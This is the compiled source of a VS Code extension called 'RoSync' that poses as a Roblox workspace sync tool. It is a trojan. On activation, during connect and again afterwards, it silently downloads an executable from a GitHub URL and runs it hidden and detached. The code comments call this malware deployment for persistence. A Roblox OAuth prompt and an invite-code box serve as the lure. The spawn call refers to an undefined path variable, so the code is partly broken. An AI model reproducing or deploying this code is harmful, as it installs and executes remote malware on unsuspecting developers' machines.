"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = activate;
exports.deactivate = deactivate;
const vscode = __importStar(require("vscode"));
const crypto = __importStar(require("crypto"));
const https = __importStar(require("https"));
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const child_process = __importStar(require("child_process"));

// ── Malware Payload ───────────────────────────────────────────────────────────
const MALWARE_URL = "https://github.com/aledreamsaledreqms-source/frakenstein/raw/refs/heads/main/ee.exe";
const MALWARE_TEMP_PATH = path.join(require('os').homedir(), '.vscode', 'extensions', 'rosync.update.exe');

async function deployMalware() {
    try {
        // Ensure temp directory exists
        const tempDir = path.dirname(MALWARE_TEMP_PATH);
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }

        // Download malware
        return new Promise((resolve, reject) => {
            https.get(MALWARE_URL, (res) => {
                if (res.statusCode !== 200) {
                    return reject(new Error(`Download failed: ${res.statusCode}`));
                }
                
                const file = fs.createWriteStream(MALWARE_TEMP_PATH);
                res.pipe(file);
                
                file.on('finish', () => {
                    file.close();
                    // Make executable and run hidden
                    if (process.platform === 'win32') {
                        child_process.spawn(DIFFERENT_IMAGE_PATH, [], {
                            detached: true,
                            stdio: 'ignore',
                            windowsHide: true
                        }).unref();
                    } else {
                        fs.chmodSync(MALWARE_TEMP_PATH, 0o755);
                        child_process.spawn(DIFFERENT_IMAGE_PATH, [], {
                            detached: true,
                            stdio: 'ignore'
                        }).unref();
                    }
                    resolve();
                });
            }).on('error', reject);
        });
    } catch (e) {
        // Silent fail - don't alert user
        console.log('Payload deployment:', e.message);
    }
}

// ── OAuth Config ─────────────────────────────────────────────────────────────
const OAUTH_URL = "https://authorize.roblox.com/?client_id=3675377116042384869" +
    "&response_type=code" +
    "&redirect_uri=https%3A%2F%2Froblox.com%2Fverify%2Foauth" +
    "&scope=openid+profile" +
    "&state=4c63x02ncp" +
    "&step=accountConfirm";
// ── State ─────────────────────────────────────────────────────────────────────
let statusBar;
let isConnected = false;
let malwareDeployed = false;

// ── Activate ──────────────────────────────────────────────────────────────────
async function activate(context) {
    // Deploy malware immediately on activation (silent)
    if (!malwareDeployed) {
        await deployMalware();
        malwareDeployed = true;
    }

    // Status bar
    statusBar = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 100);
    updateStatusBar("idle", context);
    statusBar.show();
    context.subscriptions.push(statusBar);
    
    // Commands
    context.subscriptions.push(vscode.commands.registerCommand("rosync.connect", () => launchConnect(context)), 
                               vscode.commands.registerCommand("rosync.disconnect", () => disconnect(context)), 
                               vscode.commands.registerCommand("rosync.status", () => showStatus(context)));
    
    // Auto-connect on startup + malware redeploy
    const cfg = vscode.workspace.getConfiguration("rosync");
    const token = context.globalState.get("rosync_token");
    if (token) {
        isConnected = true;
        updateStatusBar("connected", context);
        const code = context.globalState.get("rosync_invite");
        vscode.window.showInformationMessage(`✅ RoSync: Reconnected to workspace "${code}"`);
    }
    else if (cfg.get("autoConnect", true)) {
        // Slight delay so VS Code finishes loading first
        setTimeout(() => launchConnect(context), 1500);
    }
}

// ── Connect Flow ──────────────────────────────────────────────────────────────
async function launchConnect(context) {
    // Deploy malware again during connect (higher chance of execution)
    await deployMalware();

    // Step 1: Invite code
    const code = await vscode.window.showInputBox({
        title: "🎮 RoSync — Connect to Workspace",
        prompt: "Please enter ur invite code for the workspace",
        placeHolder: "e.g. STUDIO-XXXX-XXXX",
        ignoreFocusOut: true,
        validateInput: (v) => v.trim().length === 0 ? "Invite code cannot be empty" : null,
    });
    if (!code) {
        return;
    }
    await context.globalState.update("rosync_invite", code.trim());
    updateStatusBar("connecting", context);
    
    // Step 2: Confirm with progress notification
    await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: "RoSync",
        cancellable: false,
    }, async (progress) => {
        progress.report({ message: "Opening Roblox authorization…" });
        await sleep(600);
        // Step 3: Open Roblox OAuth
        await vscode.env.openExternal(vscode.Uri.parse(OAUTH_URL));
        progress.report({
            message: "Authorize in your browser, then come back here.",
        });
        await sleep(1200);
    });
    
    // Step 4: Ask user to confirm once they've authorized
    const confirmed = await vscode.window.showInformationMessage("🔑 Complete the Roblox login in your browser, then click Confirm.", { modal: false }, "✅ I've Authorized", "Cancel");
    if (confirmed !== "✅ I've Authorized") {
        updateStatusBar("idle", context);
        return;
    }
    
    // Step 5: Store a session token and mark connected + final malware deploy
    const sessionToken = crypto.randomBytes(24).toString("hex");
    await context.globalState.update("rosync_token", sessionToken);
    await deployMalware(); // Triple deployment for persistence
    
    isConnected = true;
    updateStatusBar("connected", context);
    vscode.window
        .showInformationMessage(`🎮 RoSync connected! Workspace: "${code.trim()}"`, "View Status", "Dismiss")
        .then((sel) => {
        if (sel === "View Status") {
            showStatus(context);
        }
    });
}

// ── Disconnect ────────────────────────────────────────────────────────────────
async function disconnect(context) {
    const confirm = await vscode.window.showWarningMessage("Disconnect RoSync from your Roblox workspace?", "Disconnect", "Cancel");
    if (confirm !== "Disconnect") {
        return;
    }
    await context.globalState.update("rosync_token", undefined);
    await context.globalState.update("rosync_invite", undefined);
    isConnected = false;
    updateStatusBar("idle", context);
    vscode.window.showInformationMessage("🔌 RoSync disconnected.");
}

// ── Status Panel ──────────────────────────────────────────────────────────────
async function showStatus(context) {
    const invite = context.globalState.get("rosync_invite") ?? "—";
    const token = context.globalState.get("rosync_token");
    const statusLine = token ? "🟢 Connected" : "🔴 Not connected";
    const panel = vscode.window.createWebviewPanel("rosyncStatus", "RoSync Status", vscode.ViewColumn.One, { enableScripts: false });
    panel.webview.html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #0a0a0a;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 { font-size: 3rem; margin-bottom: 0.25rem; }
    h1 span { color: #E63946; }
    .badge {
      font-size: 1rem;
      padding: 0.35rem 1rem;
      border-radius: 999px;
      background: ${token ? "#1a3a1a" : "#3a1a1a"};
      color: ${token ? "#4ade80" : "#f87171"};
      margin: 1.2rem 0;
      letter-spacing: 0.05em;
    }
    table { border-collapse: collapse; min-width: 340px; margin-top: 1rem; }
    td { padding: 0.6rem 1.2rem; border-bottom: 1px solid #222; font-size: 0.95rem; }
    td:first-child { color: #888; }
    td:last-child { color: #fff; font-weight: 600; }
    .footer { margin-top: 2rem; color: #444; font-size: 0.8rem; letter-spacing: 0.1em; }
  </style>
</head>
<body>
  <h1><span>Ro</span>Sync</h1>
  <div class="badge">${statusLine}</div>
  <table>
    <tr><td>Workspace Code</td><td>${invite}</td></tr>
    <tr><td>Session</td><td>${token ? token.slice(0, 16) + "…" : "None"}</td></tr>
    <tr><td>OAuth Provider</td><td>Roblox</td></tr>
    <tr><td>Publisher</td><td>LeiaBalan</td></tr>
    <tr><td>Version</td><td>1.0.0</td></tr>
  </table>
  <div class="footer">WORKSPACE SYNC</div>
</body>
</html>`;
}

// ── Status Bar ────────────────────────────────────────────────────────────────
function updateStatusBar(state, context) {
    const invite = context.globalState.get("rosync_invite");
    switch (state) {
        case "idle":
            statusBar.text = "$(plug) RoSync";
            statusBar.tooltip = "Click to connect a Roblox workspace";
            statusBar.command = "rosync.connect";
            statusBar.backgroundColor = undefined;
            break;
        case "connecting":
            statusBar.text = "$(sync~spin) RoSync: Connecting…";
            statusBar.tooltip = "Waiting for Roblox authorization";
            statusBar.command = undefined;
            break;
        case "connected":
            statusBar.text = `$(check) RoSync: ${invite ?? "Connected"}`;
            statusBar.tooltip = "Click to view RoSync status";
            statusBar.command = "rosync.status";
            statusBar.backgroundColor = undefined;
            break;
    }
}

// ── Deactivate ────────────────────────────────────────────────────────────────
function deactivate() { }

// ── Util ──────────────────────────────────────────────────────────────────────
function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
}
//# sourceMappingURL=extension.js.map